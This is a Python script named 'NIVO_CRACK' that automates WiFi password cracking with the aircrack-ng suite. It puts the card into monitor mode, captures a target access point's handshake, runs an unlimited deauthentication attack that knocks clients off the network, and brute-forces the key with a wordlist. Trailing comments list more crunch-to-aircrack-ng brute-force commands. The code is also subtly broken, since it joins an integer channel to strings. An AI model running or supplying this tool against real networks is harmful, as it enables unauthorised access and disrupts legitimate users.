import scapy.all as scapy
import re
from threading import Thread
import time
import os
from colorama import Fore,Back,Style

class bcolors:
    OK = '\033[92m' 
    WARNING = '\033[93m' 
    FAIL = '\033[91m' 
    RESET = '\033[0m' 


print(f"{bcolors.OK}[NIVOS] Starting...")
print(f"{bcolors.OK}[NIVOS] NIVO_CRACK Starting...")
time.sleep(1)
os.system("sudo airmon-ng check kill")
print(f"{bcolors.FAIL}[1] wlan0mon")
print(f"{bcolors.FAIL}[2] wlan1mon")
n = int(input(f"{bcolors.OK}[MENU] Please Select Interface : "))
iw = "wlan1"
if n == 1:
    iw="wlan0"
elif n == 2:
    iw="wlan1"
else:
    print(f"{bcolors.WARNING}[WARNING] Invalid Command Dedected. Please Input Valid Commands.")
print(" ")
print(f"{bcolors.OK}[NIVOS] Selected Interface : "+iw)
print(" ")
print(f"{bcolors.OK}[NIVOS] Mac Adress For Cracking...")
os.system("sudo airmon-ng start "+iw)
os.system("sudo airodump-ng "+iw+"mon")
n = input(f"{bcolors.FAIL}[NIVOS] Input Output File Name : ")
mac = input(f"{bcolors.FAIL}[NIVOS] Input MAC Adress : ")
c = int(input(f"{bcolors.FAIL}[NIVOS] Input Channel Name : "))
print(f"{bcolors.FAIL}[NIVOS] Dedected Informations...")
print(f"{bcolors.FAIL}[NIVOS] Cracking Starting...")
print(" ")
os.system("sudo airodump-ng -c "+c+" -w "+n+" --bssid "+mac+" "+iw+"mon")
print(f"{bcolors.FAIL}[NIVOS] Attacking Acces Point...")
os.system("sudo aireplay-ng -0 0 -a "+mac+" "+iw+"mon")
print(f"{bcolors.FAIL}[NIVOS] Brute Forcing To Mac Adress...")
os.system("sudo aircrack-ng -w "+"./wordlists/simple.txt"+" "+n+".cap")



#Other Ways To Hack Wifi Via Aircrack-Ng

#crunch [min password length] [max password length] [characters to use] | aircrack-ng -w - [filename.cap] -e [ESSID]

#crunch 14 14 abcdefghijklmnopqrstuvwxyz 1234567890 | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\ Rent

#crunch 14 14 -t @@@@@@@@@@@%%%  | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\ Rent

#crunch 14 14 -t pinkcoconut%%% | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\ Rent
